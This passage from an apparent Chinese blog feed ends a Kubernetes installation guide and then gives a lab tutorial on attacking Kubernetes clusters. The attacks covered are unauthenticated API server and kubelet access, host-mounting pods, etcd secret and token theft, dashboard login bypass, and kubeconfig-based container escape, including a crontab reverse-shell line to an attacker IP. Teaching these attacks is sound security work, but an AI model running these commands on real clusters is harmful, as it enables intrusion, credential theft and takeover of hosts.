&#123;&quot;max-size&quot;: &quot;100m&quot;&#125;,</span><br><span class="line">  &quot;storage-driver&quot;: &quot;overlay2&quot;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 Docker</span></span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure><h2 id="三、安装-Kubernetes-组件（所有节点执行）"><a href="#三、安装-Kubernetes-组件（所有节点执行）" class="headerlink" title="三、安装 Kubernetes 组件（所有节点执行）"></a>三、安装 Kubernetes 组件（所有节点执行）</h2><h3 id="1-配置阿里云-Kubernetes-仓库"><a href="#1-配置阿里云-Kubernetes-仓库" class="headerlink" title="1. 配置阿里云 Kubernetes 仓库"></a>1. 配置阿里云 Kubernetes 仓库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">repo_gpgcheck=0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="2-安装-kubeadm、kubelet、kubectl"><a href="#2-安装-kubeadm、kubelet、kubectl" class="headerlink" title="2. 安装 kubeadm、kubelet、kubectl"></a>2. 安装 kubeadm、kubelet、kubectl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定版本安装（示例版本 1.28.2）</span></span><br><span class="line">yum install -y kubelet-1.28.2 kubeadm-1.28.2 kubectl-1.28.2 --disableexcludes=kubernetes</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 kubelet</span></span><br><span class="line">systemctl enable kubelet &amp;&amp; systemctl start kubelet</span><br></pre></td></tr></table></figure><h2 id="四、初始化-Master-节点"><a href="#四、初始化-Master-节点" class="headerlink" title="四、初始化 Master 节点"></a>四、初始化 Master 节点</h2><p>安装网络插件:<br>使用containerd配置k8s</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//没有文件可以创建/etc/containerd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mkdir</span> /etc/containerd</span></span><br><span class="line">containerd config default &gt; /etc/containerd/config.tomlgrep sandboximage /etc/containerd/config.toml</span><br><span class="line"></span><br><span class="line">sed -i &quot;s#k8s.gcr.io/pause#registry.aliyuncs.com/google containers/pause#g&quot; /etc/containerd/config.toml</span><br><span class="line"></span><br><span class="line">sed -i &quot;s#registry.k8s.io/pause#registry.aliyuncs.com/google_containers/pause#g&quot; /etc/containerd/config.toml</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置containerd cgroup驱动程序systemd：</span></span><br><span class="line">sed -i &#x27;s#Systemdcgroup =false#Systemdcgroup = true#g&#x27; /etc/containerd/config.toml</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置文件/etc/containerd/config.toml，145行添加config_path</span></span><br><span class="line">144   [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry]</span><br><span class="line">145        config_path=&quot;/etc/containerd/certs.d&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建对应目录</span></span><br><span class="line">mkdir -p /etc/containerd/certs.d/docker.io</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置加速</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置阿里云镜像</span></span><br><span class="line">cat &gt;/etc/containerd/certs.d/docker.io/hosts.toml &lt;&lt;EOF</span><br><span class="line">server =&quot;https://docker.io&quot;</span><br><span class="line">[host.&quot;https://ms9glx6x.mirror.aliyuncs.com&quot;]</span><br><span class="line"> capabilities =[&quot;pull&quot;,&quot;resolve&quot;]</span><br><span class="line">[host.&quot;https://docker.mirrors.ustc.edu.cn&quot;]</span><br><span class="line"> capabilities =[&quot;pull&quot;,&quot;resolve&quot;]</span><br><span class="line">[host.&quot;https://registry-1.docker.io&quot;]</span><br><span class="line"> capabilities =[&quot;pull&quot;,&quot;resolve&quot; ,&quot;push&quot;]</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>上面步骤所有节点都要操作</p><p>只操作k8s-master，生成管理节点的组件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kubeadm config print init-defaults &gt; kubeadm.yaml</span><br><span class="line">kubeadm init --config kubeadm.yaml</span><br><span class="line">vim kueadm.yaml</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kueadm.yaml</span></span><br><span class="line">advertiseAddress: 192.168.200.148   #更换为master主机ip</span><br><span class="line">nodeRegistration:</span><br><span class="line">  criSocket: unix:///var/run/containerd/containerd.sock</span><br><span class="line">  imagePullPolicy: IfNotPresent</span><br><span class="line">  name: k8s-master    #更换为master的主机名</span><br><span class="line">imageRepository: registry.aliyuncs.com/google_containers  # 替换为国内镜像源</span><br><span class="line">kubernetsVersion: 1.24.4   #改为本机安装的版本</span><br><span class="line">在networking:下加入</span><br><span class="line">podSubnet: 10.244.0.0/16  #添加pod子网</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看需要使用的镜像列表,若无问题，将得到如下列表</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kubeadm config images list --config kubeadm.yaml</span></span><br><span class="line">registry.aliyuncs.com/google </span><br><span class="line">containers/kube-apiserver:v1.24.4registry.aliyuncs.com/google_containers/kube-controller-manager:v1.24.4</span><br><span class="line">registry.aliyuncs.com/google containers/kube-scheduler:v1.24.4</span><br><span class="line">registry.aliyuncs.com/google containers/kube-proxy:v1.24.4</span><br><span class="line">registry.aliyuncs.com/google containers/pause:3.7</span><br><span class="line">registry.aliyuncs.com/google containers/etcd:3.5.3-0</span><br><span class="line">registry.aliyuncs.com/google containers/coredns:v1.8.6</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提前下载镜像到本地</span></span><br><span class="line">[root@k8s-master ~]#kubeadm config images pull --config kubeadm.yaml</span><br><span class="line"></span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/kube-apiserver:v1.24.4</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google_containers/kube-controller-manager:v1.24.4</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google_containers/kube-scheduler:v1.24.4</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/kube-proxy:v1.24.4</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/pause:3.7</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/etcd:3.5.3-0</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/coredns:v1.8.6</span><br><span class="line">**配置 kubelet 使用 Docker**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>初始化 master 节点</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --config kubeadm.yaml</span><br></pre></td></tr></table></figure><p>根据提示执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure><p>会出现以下提示，将node节点加入到master中</p><p>kubeadm token create –print-join-command 可以查看加入集群的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm join 192.168.200.148:6443 --token abcdef.0123456789abcdef \</span><br><span class="line">--discovery-token-ca-cert-hash sha256:9639e444338138f5324bb769ff4898f67e906d43471adeadf2459529f681ef2d </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果出现一种情况，检测到多个 CRI（容器运行时接口）端点，无法自动选择使用哪一个，需要指定CRI</span></span><br><span class="line">--cri-socket unix:///var/run/containerd/containerd.sock #指定containerd</span><br></pre></td></tr></table></figure><p>这样就成功加入到master集群中了</p><p>由于它们是Noready状态，所以需要加入网络</p><p><strong>安装网络插件:</strong><br>flannel安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载下来后，如果主机有多个网卡，需要指定网卡</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置文件，kube-flannel.yml</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在文件的160行左右</span></span><br><span class="line">args:</span><br><span class="line">- --ip-masq</span><br><span class="line">- --kube-subnet-mgr</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加以下代码</span></span><br><span class="line">- --iface=ens33</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f kube-flannel.yml   #取下载镜像</span><br><span class="line">kubectl -n kube-flannel get po -owide -w #等待初始化镜像的拉取</span><br></pre></td></tr></table></figure><pre><code class="language-shell"># vi kube-flannel.ymlnet-conf.json: |  &#123;    &quot;Network&quot; : 10.244.0.0/16   #需要与配置pod子网一致    &quot;Backend&quot; : &#123;&#125;  &#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云攻防-K8S安全</title>
      <link href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-K8S%E5%AE%89%E5%85%A8/"/>
      <url>/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-K8S%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="云攻防-K8S安全"><a href="#云攻防-K8S安全" class="headerlink" title="云攻防-K8S安全"></a>云攻防-K8S安全</h1><p>Kubernetes 是一个开源的，用于编排云平台中多个主机上的容器化的应用，目标是让<br>部署容器化的应用能简单并且高效的使用，提供了应用部署，规划，更新，维护的一种机<br>制。其核心的特点就是能够自主的管理容器来保证云平台中的容器按照用户的期望状态运<br>行着，管理员可以加载一个微型服务，让规划器来找到合适的位置，同时，Kubernetes<br>在系统提升工具以及人性化方面，让用户能够方便的部署自己的应用。</p><p>参考：</p><p><a href="https://blog.csdn.net/qq_34101364/article/details/122506768">https://blog.csdn.net/qq_34101364/article/details/122506768</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-1.png"></p><h2 id="K8S-集群攻击点"><a href="#K8S-集群攻击点" class="headerlink" title="K8S 集群攻击点"></a>K8S 集群攻击点</h2><p>随着越来越多企业开始上云的步伐，在攻防演练中常常碰到云相关的场景，例：公有云、</p><p>私有云、混合云、虚拟化集群等。以往渗透路径「外网突破 -&gt; 提权 -&gt; 权限维持 -&gt; 信息收</p><p>集 -&gt; 横向移动 -&gt; 循环收集信息」，直到获得重要目标系统。但随着业务上云以及虚拟化技</p><p>术的引入改变了这种格局，也打开了新的入侵路径，例如：</p><ul><li><p>1、通过虚拟机攻击云管理平台，利用管理平台控制所有机器</p></li><li><p>2、通过容器进行逃逸，从而控制宿主机以及横向渗透到 K8s Master 节点控制所有容器</p></li><li><p>3、利用 KVM-QEMU &#x2F; 执行逃逸获取宿主机，进入物理网络横向移动控制云平台</p></li></ul><p>目前互联网上针对云原生场景下的攻击手法零零散散的较多，仅有一些厂商发布过相关矩</p><p>阵技术，但没有过多的细节展示，本文基于微软发布的 Kubernetes 威胁矩阵进行扩展，介绍相关的具体攻击方法。</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw">https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw</a></p><p><a href="https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ">https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ</a></p><p>cat &#x2F;proc&#x2F;1&#x2F;cgroup &#x2F;&#x2F; 查看是否存在 K8S</p><h2 id="一，api-未授权访问"><a href="#一，api-未授权访问" class="headerlink" title="一，api 未授权访问"></a>一，api 未授权访问</h2><h3 id="1，-攻击-8080-端口"><a href="#1，-攻击-8080-端口" class="headerlink" title="1， 攻击 8080 端口"></a>1， 攻击 8080 端口</h3><p>API Server 未授权访问旧版本的 k8s 的 API Server 默认会开启两个端口：8080 和 6443。6443 是安全端口，安全端口使用 TLS 加密；但是 8080 端口无需认证，仅用于测试。6443 端口需要认证，且有 TLS 保护。(k8s&lt;1.16.0) 新版本 k8s 默认已经不开启 8080。需要更改相应的配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/kubernetes/manifests/</span><br><span class="line">--insecure-port=8080</span><br><span class="line">--insecure-bind-address=0.0.0.0</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe -s 192.168.139.130:8080 get nodes</span><br><span class="line">kubectl.exe -s 192.168.139.130:8080 get pods</span><br><span class="line">//连接后创建test.yaml文件</span><br><span class="line">kubectl -s 192.168.139.130:8080 create -f test.yaml</span><br><span class="line">//同过api server 创建test.yaml文件来创建一个新的pod</span><br><span class="line">kubectl -s 192.168.139.130:8080--namespace=default exec -it test </span><br><span class="line">bash </span><br><span class="line">echo -e &quot;***** root bash -i &gt;&amp; /dev/tcp/192.168.139.128/4444 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab</span><br><span class="line">//写入定时任务，执行反弹shell</span><br></pre></td></tr></table></figure><p>test.yaml 中的内容</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5.png"></p><h3 id="2、攻击-6443-端口"><a href="#2、攻击-6443-端口" class="headerlink" title="2、攻击 6443 端口"></a>2、攻击 6443 端口</h3><p>API Server 未授权访问一些集群由于鉴权配置不当，将”system:anonymous” 用户绑定到”cluster-admin” 用户组，从而使 6443 端口允许匿名用户以管理员权限向集群内部下发指令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl create clusterrolebinding system:anonymous</span><br><span class="line">--clusterrole=cluster-admin            --user=system:anonymous</span><br></pre></td></tr></table></figure><p>攻击时访问 6443 端口，存在此情况那么可以尝试攻击</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-05-12-205753.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-创建恶意 pods</span><br><span class="line">https://192.168.139.130:6443/api/v1/namespaces/default/pods/</span><br><span class="line">//构建数据包POST</span><br><span class="line">&#123;&quot;apiVersion&quot; : &quot;v1&quot; ,&quot;kind&quot; : &quot;Pod&quot; , &quot;metadata&quot;: &#123;&quot;annotations&quot; : &#123;&quot;kubect.kubernetes.io/last-applied-configuration&quot; :&quot;&#123;\&quot;apiVersion\&quot;:\&quot;v1\,\&quot;kind\&quot; : \&quot;Pod\&quot; ,\&quot;metadata\&quot;: &#123;\&quot;annotations\&quot;: &#123;&#125; ,\&quot;name\&quot;:\&quot;tes02\&quot; ,\&quot;namespace\&quot;:\&quot;default\&quot;&#125;,\&quot;spec\&quot;: &#123;\&quot;containers\&quot; :[&#123;\&quot;image\&quot; : \&quot;nginx:1.14.2\&quot;,\&quot;name\&quot;:\&quot;test02\&quot;,\&quot;volumeMounts\&quot; :[&#123;\&quot;mountPath\&quot;:\&quot;/host\&quot;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;],\&quot;volumes\&quot;:[&#123;\&quot;hostPath\&quot;:&#123;\&quot;path\&quot; :\&quot;/\&quot; ,\&quot;type\&quot;:\&quot;Directory\&quot;&#125; ,\&quot;name\&quot;:\&quot;host\&quot; &#125;]&#125; &#125;\n&quot;&#125;&quot;name&quot; : &quot;test02&quot; ,&quot;namespace&quot; :&quot;default&quot;&#125;,&quot;spec&quot; : &#123;&quot;containers&quot; :[&#123;&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test02&quot;,&quot;volumeMounts&quot; :[&#123;&quot;mountPath&quot;:&quot;/host&quot; ,&quot;name&quot; :&quot;host&quot; &#125; ]&#125;],&quot;volumes&quot; : [ &#123;&quot;hostPath&quot; : &#123;&quot;path&quot; :&quot;/&quot; ,&quot;type&quot;&quot;Directory&quot;&#125;,&quot;name&quot;:&quot;host&quot;&#125;]&#125; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-连接判断pods</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 get pods</span><br><span class="line">-连接执行pods</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 --namespace=default exec -it test02 bash</span><br></pre></td></tr></table></figure><p>操作与上面一样，写入反弹 shell</p><h3 id="3，攻击-10250-端口：kubelet-未授权访问"><a href="#3，攻击-10250-端口：kubelet-未授权访问" class="headerlink" title="3，攻击 10250 端口：kubelet 未授权访问"></a>3，攻击 10250 端口：kubelet 未授权访问</h3><p>与 API Server 类似，Kubelet 也运行着 API 服务，默认服务端口为 10250 和 10248</p><p>Kubelet 存在的风险主要也是未授权访问，如果 Kubelet 存在未授权访问，就可以控制所在节点的权限。</p><p>条件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/kubelet/config.yaml</span><br><span class="line">修改 authentication的anonyous为true  </span><br><span class="line">将authorization mode 修改为 AlwaysAllow</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-6.png"><br>访问页面时，存在此数据代表存在漏洞<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-7-1024x432.png"><br>利用执行命令，需要利用三个参数：</p><p>namespace，pod，container</p><p>访问 <a href="https://192.168.139.132:10250/runningpods">https://192.168.139.132:10250/runningpods</a></p><p>使用谷歌 FeHelper 插件可以将 json 数据更加直观的看到</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-8.png"><br>执行模板：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -k &quot;https://192.168.139.132:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot; -d &quot;cmd=id&quot;</span><br></pre></td></tr></table></figure><p>构造触发：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.139.132:10250/run/default/test02/test02</span><br><span class="line">curl -X POST -k &quot;https://192.168.139.132:10250/run/default/test02/test02&quot; -d &quot;cmd=id&quot;</span><br></pre></td></tr></table></figure><h2 id="二，etcd-未授权访问（利用条件苛刻）"><a href="#二，etcd-未授权访问（利用条件苛刻）" class="headerlink" title="二，etcd 未授权访问（利用条件苛刻）"></a>二，etcd 未授权访问（利用条件苛刻）</h2><p>默认通过证书认证，主要存放节点的数据，如一些 token 和证书。</p><p><strong>第一种</strong>：没有配置指定–client-cert-auth 参数打开证书校验，暴露在外 etcd 服务存在未授权访问风险。</p><ul><li>暴露外部可以访问，直接未授权访问获取 secrets 和 token 利用</li></ul><p><strong>第二种</strong>: 在打开证书校验选项后，通过本地 127.0.0.1:2379 可免认证访问 Etcd 服务，但通过其他地址访问要携带 cert 进行认证访问，一般配合 ssrf 或其他利用，较为鸡肋。</p><ul><li>只能本地访问，直接未授权访问获取 secrets 和 token 利用</li></ul><p><strong>第三种</strong>: 实战中在安装 k8s 默认的配置 2379 只会监听本地，如果访问没设置 0.0.0.0 暴露，那么也就意味着最多就是本地访问，不能公网访问，只能配合 ssrf 或其他。</p><ul><li>只能本地访问，利用 ssrf 或其他进行获取 secrets 和 token 利用</li></ul><p>复现利用:<br>暴露 etcd 未授权 -&gt; 获取 secrets&amp;token-&gt; 通过 token 访问 API-Server 接管</p><p>SSRF 解决限制访问 -&gt; 获取 secrets&amp;token-&gt; 通过 token 访问 API-Server 接管</p><p>V2&#x2F;v3 版本利用参考:<a href="https://www.cnblogs.com/qtzd/p/k8s">https://www.cnblogs.com/qtzd/p/k8s</a> etcd.html</p><p>启动:kubectl createf recommended.yaml</p><p>V2 版本利用:</p><p>直接访间 <a href="http://ip:2379/v2/keys/?recursive=true%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%89%80%E6%9C%89%E7%9A%84">http://ip:2379/v2/keys/?recursive=true，可以看到所有的</a> key-value 值。(secrets token)</p><p>V3 版本利用：</p><p>1、连接提交测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get / --prefix</span><br><span class="line">./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey1&quot;Hello world1&quot;</span><br><span class="line">./etcdctl --endpoints=192.168139.136:23791 put /testdir/testkey2&quot;Hello world2&quot;</span><br><span class="line">./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey3&quot;Hello world3&quot;</span><br></pre></td></tr></table></figure><p>2、获取 k8s 的 secrets:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get / --prefix--keys-only | grep /secrets/</span><br></pre></td></tr></table></figure><p>3、读取 service account token:.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=192.168.139.136:23791 get /--prefix --keys-only | grep /secrets/kube-system/clusterrole</span><br><span class="line">./etcdctl--endpoints-192.168.139.136:23791 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jdp5z</span><br></pre></td></tr></table></figure><p>4、通过 token 访问 API-Server，获取集群的权限:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify-s https://127.0.0.1:6443/ -token=&quot;ey...&quot; -n kube-system get pods</span><br></pre></td></tr></table></figure><h2 id="三，Dashboard-未授权访问"><a href="#三，Dashboard-未授权访问" class="headerlink" title="三，Dashboard 未授权访问"></a>三，Dashboard 未授权访问</h2><p>默认端口：8001<br>配置不当导致 dashboard 未授权访问，通过 dashboard 我们可以控制整个集群。kubernetes dashboard 的未授权其实分两种情况:<br>一种是在本身就存在着不需要登录的 http 接口，但接口本身并不会暴露出来，如接口被暴露在外，就会导致 dashboard 未授权。另外一种情况则是开发嫌登录麻烦，修改了配置文件，使得安全接口 https 的 dashboard 页面可以跳过登录。</p><p><strong>漏洞复现：</strong></p><p>用户开启 enable-skip-login 时可以在登录界面点击跳过登录进 dashboard*</p><p>Kubernetes-dashboard 绋定 cluster-admin (拥有管理集群的最高权限)</p><p>启动:kubectl createf recommended.yaml<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-9.png"></p><p>进入页面后，登录旁都 Skip, 可跳过登录直接进入</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-10-1024x254.png"></p><p>后逃逸方法与上面类似</p><h2 id="五，Configfile-鉴权文件泄漏"><a href="#五，Configfile-鉴权文件泄漏" class="headerlink" title="五，Configfile 鉴权文件泄漏"></a>五，Configfile 鉴权文件泄漏</h2><p>攻击者通过 webshell、Github 等拿到了 K8s 配置的 Config 文件，操作集群，从而接管所有容器。K8s configfile 作为 K8s 集群的管理凭证，其中包含有关 K8s 集群的详细信息 (API Server、登录凭证)。如果攻击者能够访问到此文件 (如办公网员工机器入侵、泄露到 Github 的代码等)，就可以直接通过 API Server 接管 K8s 集群，带来风险隐患。用户凭证保存在 kubeconfig 文件中，通过以下顺序来找到 kubeconfig 文件:</p><ul><li><p>1，如果提供了–kubeconfig 参数，就使用提供的 kubeconfig</p></li><li><p>2，文件如果没有提供–kubeconfig 参数，但设置了环境变量 SKUBECONFIG，则使用该环境变量提供的 kubeconfig 文件</p></li><li><p>3，如果以上两种情况都没有，kubectl 就使用默认的 kubeconfig 文件<br>~&#x2F;.kube&#x2F;config</p></li></ul><p>1，使用 config 文件连接:<br>kubectl -s <a href="https://192.168.139.130:6443/">https://192.168.139.130:6443/</a> –kubeconfig&#x3D;config –insecure-skip-tls-verify&#x3D;true get nodes</p><p>2、上传利用 test.yaml 创建 pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f test.yaml -n default--kubeconfig=config</span><br></pre></td></tr></table></figure><p>3，连接 pod 后进行容器挂载逃逸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it test bash -n default--kubeconfig=config</span><br><span class="line">cd/mnt</span><br><span class="line">chroot . bash</span><br></pre></td></tr></table></figure><h2 id="六，Kubectl-Proxy-不安全配置"><a href="#六，Kubectl-Proxy-不安全配置" class="headerlink" title="六，Kubectl Proxy 不安全配置"></a>六，Kubectl Proxy 不安全配置</h2><p>当运维人员需要某个环境暴露端口或者 IP 时，会用到 Kubectl Proxy，使用 kubectl proxy 